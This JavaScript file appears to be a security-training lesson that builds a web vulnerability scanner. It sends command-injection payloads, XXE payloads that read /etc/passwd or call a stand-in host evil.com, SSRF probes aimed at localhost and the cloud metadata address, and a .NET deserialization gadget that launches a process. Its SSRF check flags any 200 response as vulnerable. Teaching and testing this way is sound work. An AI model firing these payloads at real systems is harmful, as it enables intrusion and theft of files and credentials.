/**
 * EDUCATIONAL HACKING TUTORIALS
 * Module 4: Advanced Techniques
 * Lesson 1: Advanced Exploitation
 * 
 * ‚ö†Ô∏è IMPORTANT: Educational Purpose Only
 * 
 * Learning Objectives:
 * - Understand advanced exploitation techniques
 * - Learn complex attack vectors
 * - Implement safe exploitation testing
 * - Practice ethical exploitation methods
 */

import { expect } from "chai";
import supertest from "supertest";

console.log("=== ADVANCED EXPLOITATION TECHNIQUES ===");

// Advanced Exploitation Framework
class AdvancedExploitationFramework {
  constructor() {
    this.exploits = [];
    this.testResults = [];
  }

  async testCommandInjection(url, endpoint, parameter) {
    console.log(`\nüîç Testing Command Injection on: ${endpoint}`);
    
    const payloads = [
      "; ls",
      "| whoami",
      "& id",
      "`whoami`",
      "$(id)",
      "|| ping -c 3 127.0.0.1"
    ];
    
    const results = [];
    
    for (const payload of payloads) {
      try {
        const response = await supertest(url)
          .get(`${endpoint}?${parameter}=${encodeURIComponent(payload)}`)
          .timeout(5000);
        
        // Check for command execution indicators
        const body = JSON.stringify(response.body).toLowerCase();
        const indicators = [
          "uid=",
          "gid=",
          "groups=",
          "root",
          "www-data",
          "daemon"
        ];
        
        if (indicators.some(indicator => body.includes(indicator))) {
          results.push({
            type: "Command Injection",
            severity: "critical",
            payload: payload,
            vulnerable: true,
            description: "Potential command injection vulnerability detected"
          });
        } else {
          results.push({
            type: "Command Injection",
            severity: "info",
            payload: payload,
            vulnerable: false
          });
        }
      } catch (error) {
        results.push({
          type: "Command Injection",
          severity: "info",
          payload: payload,
          vulnerable: false,
          error: error.message
        });
      }
    }
    
    return results;
  }

  async testXXEInjection(url, endpoint) {
    console.log(`\nüîç Testing XXE Injection on: ${endpoint}`);
    
    const xxePayloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/steal">]><root>&test;</root>'
    ];
    
    const results = [];
    
    for (const payload of xxePayloads) {
      try {
        const response = await supertest(url)
          .post(endpoint)
          .set("Content-Type", "application/xml")
          .send(payload)
          .timeout(5000);
        
        const body = JSON.stringify(response.body);
        
        // Check for XXE indicators
        if (body.includes("root:") || body.includes("bin/bash") || body.includes("daemon:")) {
          results.push({
            type: "XXE Injection",
            severity: "high",
            payload: payload.substring(0, 50) + "...",
            vulnerable: true,
            description: "Potential XXE injection vulnerability detected"
          });
        } else {
          results.push({
            type: "XXE Injection",
            severity: "info",
            payload: payload.substring(0, 50) + "...",
            vulnerable: false
          });
        }
      } catch (error) {
        results.push({
          type: "XXE Injection",
          severity: "info",
          payload: payload.substring(0, 50) + "...",
          vulnerable: false,
          error: error.message
        });
      }
    }
    
    return results;
  }

  async testSSRF(url, endpoint, parameter) {
    console.log(`\nüîç Testing SSRF on: ${endpoint}`);
    
    const ssrfPayloads = [
      "http://127.0.0.1:22",
      "http://localhost/admin",
      "file:///etc/passwd",
      "http://169.254.169.254/latest/meta-data/",
      "gopher://127.0.0.1:6379"
    ];
    
    const results = [];
    
    for (const payload of ssrfPayloads) {
      try {
        const response = await supertest(url)
          .get(`${endpoint}?${parameter}=${encodeURIComponent(payload)}`)
          .timeout(5000);
        
        const body = JSON.stringify(response.body);
        
        // Check for SSRF indicators
        if (body.includes("root:") || 
            body.includes("ssh-") || 
            body.includes("instance-id") ||
            response.status === 200) {
          results.push({
            type: "SSRF",
            severity: "high",
            payload: payload,
            vulnerable: true,
            description: "Potential SSRF vulnerability detected"
          });
        } else {
          results.push({
            type: "SSRF",
            severity: "info",
            payload: payload,
            vulnerable: false
          });
        }
      } catch (error) {
        results.push({
          type: "SSRF",
          severity: "info",
          payload: payload,
          vulnerable: false,
          error: error.message
        });
      }
    }
    
    return results;
  }

  async testInsecureDeserialization(url, endpoint) {
    console.log(`\nüîç Testing Insecure Deserialization on: ${endpoint}`);
    
    // This is a conceptual test - actual implementation depends on the framework
    const results = [];
    
    try {
      // Test with potentially malicious serialized data
      const maliciousPayload = {
        __type: "System.Windows.Data.ObjectDataProvider",
        MethodName: "Start",
        ObjectInstance: {
          __type: "System.Diagnostics.Process",
          StartInfo: {
            __type: "System.Diagnostics.ProcessStartInfo",
            FileName: "calc",
            Arguments: ""
          }
        }
      };
      
      const response = await supertest(url)
        .post(endpoint)
        .send(maliciousPayload)
        .timeout(5000);
      
      // Check for deserialization errors or unexpected behavior
      if (response.status === 500 && 
          JSON.stringify(response.body).toLowerCase().includes("deserializ")) {
        results.push({
          type: "Insecure Deserialization",
          severity: "critical",
          vulnerable: true,
          description: "Potential insecure deserialization vulnerability"
        });
      } else {
        results.push({
          type: "Insecure Deserialization",
          severity: "info",
          vulnerable: false
        });
      }
    } catch (error) {
      results.push({
        type: "Insecure Deserialization",
        severity: "info",
        vulnerable: false,
        error: error.message
      });
    }
    
    return results;
  }

  generateExploitationReport() {
    console.log("\nüìä Advanced Exploitation Test Report:");
    console.log("=" .repeat(50));
    
    const vulnerable = this.testResults.filter(r => r.vulnerable === true);
    const total = this.testResults.length;
    
    console.log(`Total Tests: ${total}`);
    console.log(`Vulnerabilities Found: ${vulnerable.length}`);
    
    if (vulnerable.length > 0) {
      console.log("\nVulnerabilities:");
      vulnerable.forEach(vuln => {
        console.log(`  - ${vuln.type}: ${vuln.severity} severity`);
      });
    }
    
    console.log("=" .repeat(50));
    
    return {
      total: total,
      vulnerable: vulnerable.length,
      results: this.testResults
    };
  }
}

// Test Scenarios
async function testCommandInjection() {
  console.log("\nüìù Test 1: Command Injection Testing");
  
  const framework = new AdvancedExploitationFramework();
  const results = await framework.testCommandInjection(
    "https://example.com",
    "/api/search",
    "query"
  );
  
  expect(results).to.be.an("array");
  framework.testResults.push(...results);
  
  console.log(`‚úÖ Command injection test completed (${results.length} payloads tested)`);
}

async function testXXEInjection() {
  console.log("\nüìù Test 2: XXE Injection Testing");
  
  const framework = new AdvancedExploitationFramework();
  const results = await framework.testXXEInjection(
    "https://example.com",
    "/api/xml"
  );
  
  expect(results).to.be.an("array");
  framework.testResults.push(...results);
  
  console.log(`‚úÖ XXE injection test completed (${results.length} payloads tested)`);
}

async function testSSRF() {
  console.log("\nüìù Test 3: SSRF Testing");
  
  const framework = new AdvancedExploitationFramework();
  const results = await framework.testSSRF(
    "https://example.com",
    "/api/fetch",
    "url"
  );
  
  expect(results).to.be.an("array");
  framework.testResults.push(...results);
  
  console.log(`‚úÖ SSRF test completed (${results.length} payloads tested)`);
}

async function testExploitationReport() {
  console.log("\nüìù Test 4: Generate Exploitation Report");
  
  const framework = new AdvancedExploitationFramework();
  await framework.testCommandInjection("https://example.com", "/api/search", "query");
  
  const report = framework.generateExploitationReport();
  expect(report).to.have.property("total");
  expect(report).to.have.property("vulnerable");
  
  console.log("‚úÖ Exploitation report generation test passed");
}

// Run all tests
(async () => {
  try {
    console.log("\n‚ö†Ô∏è  REMINDER: This tutorial is for educational purposes only.");
    console.log("   Only test systems you own or have explicit permission to test.\n");
    
    await testCommandInjection();
    await testXXEInjection();
    await testSSRF();
    await testExploitationReport();
    
    console.log("\n‚úÖ All advanced exploitation tests completed!");
    console.log("\nüìö Key Takeaways:");
    console.log("   - Advanced exploitation requires deep understanding of systems");
    console.log("   - Always test in controlled environments");
    console.log("   - Document all findings for responsible disclosure");
    console.log("   - Follow ethical hacking principles");
  } catch (error) {
    console.error("‚ùå Test failed:", error.message);
    process.exit(1);
  }
})();

